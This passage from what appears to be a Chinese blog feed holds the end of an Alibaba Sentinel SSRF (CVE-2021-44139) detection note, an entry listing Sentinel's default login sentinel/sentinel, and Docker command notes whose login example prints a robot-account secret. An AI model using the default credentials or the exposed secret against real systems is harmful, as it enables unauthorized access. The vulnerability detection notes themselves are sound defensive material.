&lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654327000&amp;endTime=1708654333000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">36.878</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654334000&amp;endTime=1708654340000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">43.857</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654341000&amp;endTime=1708654347000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">50.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654348000&amp;endTime=1708654354000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57.904</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654355000&amp;endTime=1708654361000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">04.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654362000&amp;endTime=1708654368000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">11.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654369000&amp;endTime=1708654375000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">18.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654376000&amp;endTime=1708654382000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><br></code></pre></td></tr></table></figure><h3 id="控制台"><a href="#控制台" class="headerlink" title="控制台"></a>控制台</h3><p>检查 控制台-&gt;机器列表中是否存在未知异常的机器信息</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] Report a Sentinel Security Vulnerability about SSRF #2451 threedr3am Nov 18, 2021<br>链接：<a href="https://github.com/alibaba/Sentinel/issues/2451">https://github.com/alibaba/Sentinel/issues/2451</a></p><p>[2] Alibaba Sentinel SSRF漏洞(CVE-2021-44139)浅析 ordar 2022-08-30</p><p>链接：<a href="https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/">https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>alibaba_Sentinel_base</title>
    <link href="/2024/02/21/security/secvulns/alibaba%20Sentinel/alibaba_Sentinel_base/"/>
    <url>/2024/02/21/security/secvulns/alibaba%20Sentinel/alibaba_Sentinel_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>默认端口：8080</p><p>默认密码 sentinel&#x2F;sentinel</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_command</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_command/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>命令基于 mac Docker Desktop 4.11.1 (84025) </p><h1 id="docker服务"><a href="#docker服务" class="headerlink" title="docker服务"></a>docker服务</h1><h2 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h2><h3 id="docker-info"><a href="#docker-info" class="headerlink" title="docker info"></a>docker info</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➜</span>  <span class="hljs-string">test</span> <span class="hljs-string">docker</span> <span class="hljs-string">info</span><br><span class="hljs-attr">Client:</span><br> <span class="hljs-attr">Context:</span>    <span class="hljs-string">default</span><br> <span class="hljs-attr">Debug Mode:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">Plugins:</span><br>  <span class="hljs-attr">buildx:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Buildx</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v0.8.2)</span><br>  <span class="hljs-attr">compose:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Compose</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v2.7.0)</span><br>  <span class="hljs-attr">extension:</span> <span class="hljs-string">Manages</span> <span class="hljs-string">Docker</span> <span class="hljs-string">extensions</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v0.2.8)</span><br>  <span class="hljs-attr">sbom:</span> <span class="hljs-string">View</span> <span class="hljs-string">the</span> <span class="hljs-string">packaged-based</span> <span class="hljs-string">Software</span> <span class="hljs-string">Bill</span> <span class="hljs-string">Of</span> <span class="hljs-string">Materials</span> <span class="hljs-string">(SBOM)</span> <span class="hljs-string">for</span> <span class="hljs-string">an</span> <span class="hljs-string">image</span> <span class="hljs-string">(Anchore</span> <span class="hljs-string">Inc.,</span> <span class="hljs-number">0.6</span><span class="hljs-number">.0</span><span class="hljs-string">)</span><br>  <span class="hljs-attr">scan:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Scan</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v0.17.0)</span><br><br><span class="hljs-attr">Server:</span><br> <span class="hljs-attr">Containers:</span> <span class="hljs-number">10</span><br>  <span class="hljs-attr">Running:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">Paused:</span> <span class="hljs-number">0</span><br>  <span class="hljs-attr">Stopped:</span> <span class="hljs-number">8</span><br> <span class="hljs-attr">Images:</span> <span class="hljs-number">14</span><br> <span class="hljs-attr">Server Version:</span> <span class="hljs-number">20.10</span><span class="hljs-number">.17</span><br> <span class="hljs-attr">Storage Driver:</span> <span class="hljs-string">overlay2</span><br>  <span class="hljs-attr">Backing Filesystem:</span> <span class="hljs-string">extfs</span><br>  <span class="hljs-attr">Supports d_type:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">Native Overlay Diff:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">userxattr:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">Logging Driver:</span> <span class="hljs-string">json-file</span><br> <span class="hljs-attr">Cgroup Driver:</span> <span class="hljs-string">cgroupfs</span><br> <span class="hljs-attr">Cgroup Version:</span> <span class="hljs-number">2</span><br> <span class="hljs-attr">Plugins:</span><br>  <span class="hljs-attr">Volume:</span> <span class="hljs-string">local</span><br>  <span class="hljs-attr">Network:</span> <span class="hljs-string">bridge</span> <span class="hljs-string">host</span> <span class="hljs-string">ipvlan</span> <span class="hljs-string">macvlan</span> <span class="hljs-literal">null</span> <span class="hljs-string">overlay</span><br>  <span class="hljs-attr">Log:</span> <span class="hljs-string">awslogs</span> <span class="hljs-string">fluentd</span> <span class="hljs-string">gcplogs</span> <span class="hljs-string">gelf</span> <span class="hljs-string">journald</span> <span class="hljs-string">json-file</span> <span class="hljs-string">local</span> <span class="hljs-string">logentries</span> <span class="hljs-string">splunk</span> <span class="hljs-string">syslog</span><br> <span class="hljs-attr">Swarm:</span> <span class="hljs-string">inactive</span><br> <span class="hljs-attr">Runtimes:</span> <span class="hljs-string">runc</span> <span class="hljs-string">io.containerd.runc.v2</span> <span class="hljs-string">io.containerd.runtime.v1.linux</span><br> <span class="hljs-attr">Default Runtime:</span> <span class="hljs-string">runc</span><br> <span class="hljs-attr">Init Binary:</span> <span class="hljs-string">docker-init</span><br> <span class="hljs-attr">containerd version:</span> <span class="hljs-string">10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1</span><br> <span class="hljs-attr">runc version:</span> <span class="hljs-string">v1.1.2-0-ga916309</span><br> <span class="hljs-attr">init version:</span> <span class="hljs-string">de40ad0</span><br> <span class="hljs-attr">Security Options:</span><br>  <span class="hljs-string">seccomp</span><br>   <span class="hljs-attr">Profile:</span> <span class="hljs-string">default</span><br>  <span class="hljs-string">cgroupns</span><br> <span class="hljs-attr">Kernel Version:</span> <span class="hljs-number">5.10</span><span class="hljs-number">.104</span><span class="hljs-string">-linuxkit</span><br> <span class="hljs-attr">Operating System:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Desktop</span><br> <span class="hljs-attr">OSType:</span> <span class="hljs-string">linux</span><br> <span class="hljs-attr">Architecture:</span> <span class="hljs-string">aarch64</span><br> <span class="hljs-attr">CPUs:</span> <span class="hljs-number">4</span><br> <span class="hljs-attr">Total Memory:</span> <span class="hljs-number">3.</span><span class="hljs-string">841GiB</span><br> <span class="hljs-attr">Name:</span> <span class="hljs-string">docker-desktop</span><br> <span class="hljs-attr">ID:</span> <span class="hljs-string">4PPK:ZEQN:27ZX:7RDL:BASL:RHIO:UZXN:DTSX:UHWP:HBFU:2DYI:EJRN</span><br> <span class="hljs-attr">Docker Root Dir:</span> <span class="hljs-string">/var/lib/docker</span><br> <span class="hljs-attr">Debug Mode:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">HTTP Proxy:</span> <span class="hljs-string">http.docker.internal:3128</span><br> <span class="hljs-attr">HTTPS Proxy:</span> <span class="hljs-string">http.docker.internal:3128</span><br> <span class="hljs-attr">No Proxy:</span> <span class="hljs-string">hubproxy.docker.internal</span><br> <span class="hljs-attr">Registry:</span> <span class="hljs-string">https://index.docker.io/v1/</span><br> <span class="hljs-attr">Labels:</span><br> <span class="hljs-attr">Experimental:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">Insecure Registries:</span><br>  <span class="hljs-string">hubproxy.docker.internal:5000</span><br>  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/8</span><br> <span class="hljs-attr">Registry Mirrors:</span><br>  <span class="hljs-string">https://zp98nloz.mirror.aliyuncs.com/</span><br> <span class="hljs-attr">Live Restore Enabled:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h2 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h2><p>docker system prune -a</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs livescript">[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment"># docker ps</span><br>CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS                    NAMES<br><span class="hljs-number">84457a</span>2d6565        xuxueli/xxl-job-admin:<span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>   <span class="hljs-string">&quot;sh -c &#x27;java -jar ...&quot;</span>   <span class="hljs-number">25</span> minutes ago      Up <span class="hljs-number">25</span> minutes       <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8080</span>-&gt;<span class="hljs-number">8080</span>/tcp   xxl-job-admin<br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment"># docker images</span><br>REPOSITORY                        TAG                 IMAGE ID            CREATED             SIZE<br>docker.io/xuxueli/xxl-job-admin   <span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>               <span class="hljs-number">252b</span>168021da        <span class="hljs-number">2</span> years ago         <span class="hljs-number">237</span> MB<br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment">#</span><br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment">#</span><br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment">#</span><br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment"># docker system prune -a</span><br>WARNING! This will remove:<br>- all stopped containers<br>- all volumes <span class="hljs-keyword">not</span> used <span class="hljs-keyword">by</span> at least one container<br>- all networks <span class="hljs-keyword">not</span> used <span class="hljs-keyword">by</span> at least one container<br>- all images without at least one container associated <span class="hljs-keyword">to</span> them<br>Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span>? [y/N] y<br>Deleted Networks:<br>unacc_default<br><br>Total reclaimed space: <span class="hljs-number">0</span> B<br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment">#</span><br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment">#</span><br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment"># docker images</span><br>REPOSITORY                        TAG                 IMAGE ID            CREATED             SIZE<br>docker.io/xuxueli/xxl-job-admin   <span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>               <span class="hljs-number">252b</span>168021da        <span class="hljs-number">2</span> years ago         <span class="hljs-number">237</span> MB<br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment"># docker ps</span><br>CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS                    NAMES<br><span class="hljs-number">84457a</span>2d6565        xuxueli/xxl-job-admin:<span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>   <span class="hljs-string">&quot;sh -c &#x27;java -jar ...&quot;</span>   <span class="hljs-number">26</span> minutes ago      Up <span class="hljs-number">26</span> minutes       <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8080</span>-&gt;<span class="hljs-number">8080</span>/tcp   xxl-job-admin<br></code></pre></td></tr></table></figure><h1 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h1><h2 id="登录镜像仓库"><a href="#登录镜像仓库" class="headerlink" title="登录镜像仓库"></a>登录镜像仓库</h2><h3 id="docker-login"><a href="#docker-login" class="headerlink" title="docker login"></a>docker login</h3><p><strong>docker login [OPTIONS] [SERVER] [flags]</strong></p><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>以用户名&#x2F;密码或机器人账户&#x2F;密钥方式登录指定镜像仓库</p><h4 id="SERVER"><a href="#SERVER" class="headerlink" title="SERVER"></a>SERVER</h4><p>指定镜像仓库地址，例如：hub.xxx.com</p><h4 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h4><h5 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--password string </span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--password-stdin</span><br></code></pre></td></tr></table></figure><h5 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--username string</span><br></code></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>机器人账户：robot-0207</p><p>机器人密钥：wlRCBQX68DCZIrCHoSAvACm1xpdadTBF</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  test docker <span class="hljs-keyword">login</span> registry.xxx.xxx.com -u robot<span class="hljs-number">-0227</span> -p wlRCBQX68DCZIrCHoSAvACm1xpdadTBF<br><span class="hljs-built_in">WARNING</span>! <span class="hljs-keyword">Using</span> <span class="hljs-comment">--password via the CLI is insecure. Use --password-stdin.</span><br><span class="hljs-keyword">Login</span> Succeeded<br></code></pre></td></tr></table></figure><h2 id="退出镜仓库"><a href="#退出镜仓库" class="headerlink" title="退出镜仓库"></a>退出镜仓库</h2><h3 id="docker-logout"><a href="#docker-logout" class="headerlink" title="docker logout"></a>docker logout</h3><p><strong>docker logout [SERVER] [flags]</strong></p><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>退出指定镜像仓库</p><h4 id="SERVER-1"><a href="#SERVER-1" class="headerlink" title="SERVER"></a>SERVER</h4><p>指定镜像仓库地址，例如：hub.xxx.com</p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">➜  <span class="hljs-symbol">~ docker logout</span><br><span class="hljs-symbol">Removing login credentials for https</span>:<span class="hljs-comment">//index.docker.io/v1/</span><br></code></pre></td></tr></table></figure><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><h2 id="查询镜像"><a href="#查询镜像" class="headerlink" title="查询镜像"></a>查询镜像</h2><h3 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h3><p><strong>docker search [OPTIONS] TEAM</strong></p><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>默认官方 Docker Hub （hub.docker.com）查找镜像</p><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-–filter-filter"><a href="#f-–filter-filter" class="headerlink" title="-f –filter filter"></a>-f –filter filter</h5><p>Filter output based on conditions provided 根据过滤条件过滤镜像</p><h5 id="–no-trunc"><a href="#–no-trunc" class="headerlink" title="–no-trunc"></a>–no-trunc</h5><p>Don’t truncate output 不截断输出，也就是显示完整的镜像描述</p><h5 id="–limit-ini"><a href="#–limit-ini" class="headerlink" title="–limit ini"></a>–limit ini</h5><p>Max number of search results (default 25) 搜索结果的最大数目(默认25个)</p><h5 id="–format-string"><a href="#–format-string" class="headerlink" title="–format string"></a>–format string</h5><p>Pretty-print search using a Go template</p><h4 id="TEAM"><a href="#TEAM" class="headerlink" title="TEAM"></a>TEAM</h4><p>指定需要查询的镜像名</p><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><h5 id="查找镜像名包含memcached且收藏数大于10的镜像"><a href="#查找镜像名包含memcached且收藏数大于10的镜像" class="headerlink" title="查找镜像名包含memcached且收藏数大于10的镜像"></a>查找镜像名包含memcached且收藏数大于10的镜像</h5><p>docker search -f stars&#x3D;10 memcached –no-trunc</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  /tmp docker <span class="hljs-keyword">search</span> -f stars=<span class="hljs-number">10</span> memcached <span class="hljs-comment">--no-trunc</span><br><span class="hljs-type">NAME</span>                       DESCRIPTION                                                                       STARS     OFFICIAL   AUTOMATED<br>memcached                  Free &amp; <span class="hljs-keyword">open</span> source, high-performance, distributed memory <span class="hljs-keyword">object</span> caching <span class="hljs-keyword">system</span>.   <span class="hljs-number">2135</span>      [OK]       <br>bitnami/memcached          Bitnami Memcached Docker Image                                                    <span class="hljs-number">32</span>                   [OK]<br>sylvainlasnier/memcached   Memcached docker images based <span class="hljs-keyword">on</span> Ubuntu <span class="hljs-number">14.10</span>. It <span class="hljs-keyword">is</span> small <span class="hljs-keyword">and</span> basic.             <span class="hljs-number">28</span>                   [OK]<br>rapidfort/memcached-ib     RapidFort optimized, hardened image <span class="hljs-keyword">for</span> Memcached IronBank                        <span class="hljs-number">12</span>                   <br>rapidfort/memcached        RapidFort optimized, hardened image <span class="hljs-keyword">for</span> Memcached                                 <span class="hljs-number">11</span>                   <br>prom/memcached-exporter    Exports metrics <span class="hljs-keyword">from</span> memcached servers <span class="hljs-keyword">for</span> consumption <span class="hljs-keyword">by</span> Prometheus.             <span class="hljs-number">10</span>               <br></code></pre></td></tr></table></figure><p>NAME：镜像名</p><p>DESCRIPTION：描述</p><p>START：关注数</p><p>OFFICIAL：是否为docker官方发布</p><p>AUTOMATED：自动构建</p><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><h3 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h3><p><strong>docker pull [OPTIONS] NAME[:TAG|@DIGEST]</strong></p><h4 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h4><p>从镜像仓库中拉取或者更新指定镜像，如不选定版本号，则下载最新镜像</p><h4 id="OPTIONS-1"><a href="#OPTIONS-1" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="a-–all-tags"><a href="#a-–all-tags" class="headerlink" title="-a –all-tags"></a>-a –all-tags</h5><p>拉取所有tagged镜像</p><h5 id="–distable-content-trust"><a href="#–distable-content-trust" class="headerlink" title="–distable-content-trust"></a>–distable-content-trust</h5><p>忽略镜像的校验，默认是开启校验的</p><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>1、pull命令中的NAME，取决于<a href="https://hub.docker.com/%E4%B8%AD%E6%98%BE%E7%A4%BA%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%90%8D%E3%80%82">https://hub.docker.com/中显示的软件名。</a></p><p>例如：</p><p>下载 mysql 8.3.0 版本，使用 docker pull mysql:8.3.0</p><p>下载 grafana&#x2F;grafana 10.2.4 版本，使用 docker pull grafana&#x2F;grafana:10.2.4 </p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@localhost grafana]<span class="hljs-comment"># docker pull grafana/grafana:6.3.3</span><br><span class="hljs-number">6.3</span><span class="hljs-number">.3</span>: Pulling <span class="hljs-keyword">from</span> grafana/grafana<br>[root@localhost grafana]<span class="hljs-comment"># docker pull grafana/grafana:8.2.6</span><br><span class="hljs-number">8.2</span><span class="hljs-number">.6</span>: Pulling <span class="hljs-keyword">from</span> grafana/grafana<br><br>[root@localhost grafana]<span class="hljs-comment"># docker images | grep grafana</span><br>grafana/grafana                                                   <span class="hljs-number">8.2</span><span class="hljs-number">.6</span>     aeeaa96eea83   <span class="hljs-number">5</span> months ago   <span class="hljs-number">253</span>MB<br>grafana/grafana                                                   <span class="hljs-number">6.3</span><span class="hljs-number">.3</span>     a6e14b4109af   <span class="hljs-number">2</span> years ago    <span class="hljs-number">253</span>MB<br></code></pre></td></tr></table></figure><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4><p>从 docker hub 下载最新版memcached</p><p>docker pull memcached</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">(base) root@localhost:~<span class="hljs-comment"># docker pull memcached:latest</span><br><span class="hljs-section">latest: Pulling from library/memcached</span><br><span class="hljs-section">c229119241af: Pull complete </span><br><span class="hljs-section">af2f0309d301: Pull complete </span><br><span class="hljs-section">35783664a727: Pull complete </span><br><span class="hljs-section">a0d63d088cef: Pull complete </span><br><span class="hljs-section">d2f1f521665d: Pull complete </span><br><span class="hljs-section">24f6b2ace768: Pull complete </span><br><span class="hljs-section">Digest: sha256:c42541495ec1a6925cb105635bcafeedf60a56e3b9e4ac8b1afaf6d7851d70b2</span><br><span class="hljs-section">Status: Downloaded newer image for memcached:latest</span><br><span class="hljs-section">docker.io/library/memcached:latest</span><br></code></pre></td></tr></table></figure><h2 id="查看镜像历史"><a href="#查看镜像历史" class="headerlink" title="查看镜像历史"></a>查看镜像历史</h2><h3 id="docker-history"><a href="#docker-history" class="headerlink" title="docker history"></a>docker history</h3><p><strong>docker history [OPTIONS] images</strong></p><h4 